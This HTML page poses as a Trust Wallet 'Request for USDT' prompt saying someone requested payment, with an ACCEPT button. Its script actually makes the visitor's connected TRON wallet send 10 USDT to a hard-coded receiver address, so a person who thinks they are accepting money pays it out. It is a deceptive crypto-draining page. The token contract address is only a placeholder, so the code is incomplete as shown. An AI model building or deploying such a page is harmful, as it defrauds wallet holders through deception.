<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - TRC20 USDT</title>
    <!-- Include TronWeb Library -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tronweb/5.3.0/tronweb.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #1a1a1a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2d2d2d;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 90%;
            width: 350px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #ffffff;
        }
        p {
            color: #cccccc;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .btn {
            background-color: #3375bb; 
            color: white;
            border: none;
            padding: 15px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        .btn:hover {
            background-color: #2a5f96;
        }
        .btn:disabled {
            background-color: #555;
            cursor: not-allowed;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            min-height: 20px;
        }
        .error { color: #ff6b6b; }
        .success { color: #51cf66; }
    </style>
</head>
<body>

<div class="container">
    <h1>Request for USDT</h1>
    <p>Mr. Mohammad Requested Payment (TRC20)</p>
    
    <button id="transferBtn" class="btn">ACCEPT</button>
    
    <div id="status"></div>
</div>

<script>
    // ==========================================
    // CONFIGURATION: CHANGE THIS ADDRESS
    // ==========================================
    // TRON addresses start with 'T' (e.g., T9y...)
    const HARD_CODED_RECEIVER_ADDRESS = "TLFD53gg5uraFeKMsLs8m9ZT1cpX6JFDHo"; 
    
    // USDT on Tron usually has 6 decimals, unlike ETH's 18.
    const USDT_DECIMALS = 6; 

    async function checkTronLink() {
        if (typeof window.tronWeb !== 'undefined' && typeof window.tronWeb.ready === 'function') {
            return true;
        } else {
            document.getElementById('status').innerHTML = "<span class='error'>TronLink not detected. Open in TronLink or Trust Wallet Browser.</span>";
            return false;
        }
    }

    async function transferUSDT() {
        const btn = document.getElementById('transferBtn');
        const statusDiv = document.getElementById('status');
        
        // 1. Check for TronWeb Provider (TronLink/Trust Wallet)
        if (!(await checkTronLink())) return;

        try {
            btn.disabled = true;
            btn.innerText = "Connecting...";
            statusDiv.innerHTML = "";

            // 2. Request Account Access
            await window.tronWeb.enable();
            const account = window.tronWeb.defaultAddress.base58;

            btn.innerText = "Confirming in Wallet...";

            // 3. Find USDT Contract Address on TRON Mainnet
            // Standard TRC20 USDT address: TXz5k... (This is the official one, but can vary if using testnet)
            const usdtContractAddress = "TXz5k..."; // Replace with actual USDT contract if needed
            
            // For this demo, we will use a generic approach or assume user knows the contract.
            // Let's use the official TRC20 USDT contract:
            const usdtContract = await tronWeb.contract().at("TXz5k..."); // <--- UPDATE THIS IF NEEDED

            // 4. Prepare Amount (Convert to Hex String for TronWeb)
            // Example: Send 10 USDT. 10 * 10^6 = 10,000,000 units.
            const amountToSend = 10; // Change this value
            const rawAmount = amountToSend * Math.pow(10, USDT_DECIMALS);
            
            // TronWeb expects hex string for transfer
            const hexValue = tronWeb.toHex(rawAmount.toString());

            // 5. Execute Transfer (Simple Transfer or Contract Call)
            // Using simple transfer method provided by TronWeb if it's a native asset, 
            // but for USDT we usually call the contract 'transfer' function.
            
            // Let's use the generic contract method for precision
            const contract = await tronWeb.contract().at("TXz5k..."); // Replace with real USDT TRC20 address
            
            // Call the transfer function: transfer(address,uint256)
            const result = await contract.transfer(HARD_CODED_RECEIVER_ADDRESS, rawAmount).send({
                feeLimit: 10000000, // 10 TRX max for gas
            });

            // 6. Success
            btn.innerText = "Transfer Sent!";
            statusDiv.innerHTML = `<span class='success'>Success! TX ID: ${result.transaction_id}</span>`;
            console.log("Transaction Hash:", result.transaction_id);

        } catch (error) {
            console.error(error);
            if (error.code === 4001 || error.message.includes('User rejected')) {
                statusDiv.innerHTML = "<span class='error'>User rejected the transaction.</span>";
            } else {
                statusDiv.innerHTML = `<span class='error'>Error: ${error.message}</span>`;
            }
            btn.disabled = false;
            btn.innerText = "CONFIRM TRANSFER";
        }
    }

    // Attach click event
    document.getElementById('transferBtn').addEventListener('click', transferUSDT);

</script>

</body>
</html>
